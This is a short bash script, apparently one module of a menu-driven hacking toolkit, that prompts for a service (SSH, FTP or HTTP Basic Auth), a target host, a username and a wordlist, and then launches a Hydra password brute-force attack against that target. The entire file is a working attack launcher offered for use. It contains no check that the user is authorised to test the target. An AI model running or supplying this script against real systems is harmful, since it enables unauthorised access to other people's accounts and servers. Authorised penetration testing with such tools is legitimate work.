#!/bin/bash

clear
toilet -f pagga "Hydra Attack" | lolcat
echo -e "\e[1;36m🔐 Real Brute Force Attack with Hydra\e[0m"
echo ""

echo -e "\e[1;33mChoose the service to target:\e[0m"
echo -e "\e[1;32m1)\e[0m SSH"
echo -e "\e[1;32m2)\e[0m FTP"
echo -e "\e[1;32m3)\e[0m HTTP (Basic Auth)"
echo -e "\e[1;31m0)\e[0m Back to Menu"
echo ""

read -p $'\e[1;34mSelect option: \e[0m' service

case $service in
    1) svc="ssh" ;;
    2) svc="ftp" ;;
    3) svc="http-get" ;;
    0) bash modules/brute_force.sh ;;
    *) echo -e "\e[1;31mInvalid option.\e[0m"; exit 1 ;;
esac

echo ""
read -p $'\e[1;34mEnter target IP or domain: \e[0m' target
read -p $'\e[1;34mEnter username to brute-force: \e[0m' user

# List available wordlists from kirahash/wordlists
echo -e "\n\e[1;33mAvailable wordlists:\e[0m"
select file in $(ls "$HOME/Desktop/kirahash/wordlists") "Enter custom path"; do
    if [[ "$file" == "Enter custom path" ]]; then
        read -p $'\e[1;34mEnter full path to wordlist: \e[0m' wordlist
        break
    elif [[ -n "$file" ]]; then
        wordlist="$HOME/Desktop/kirahash/wordlists/$file"
        break
    else
        echo "Invalid selection."
    fi
done

echo -e "\n\e[1;35mLaunching brute-force with Hydra...\e[0m"
sleep 2

hydra -l "$user" -P "$wordlist" "$target" "$svc" -V

echo -e "\n\e[1;36m💥 Attack finished.\e[0m"
read -p $'\nPress Enter to return...' temp
bash modules/brute_force.sh
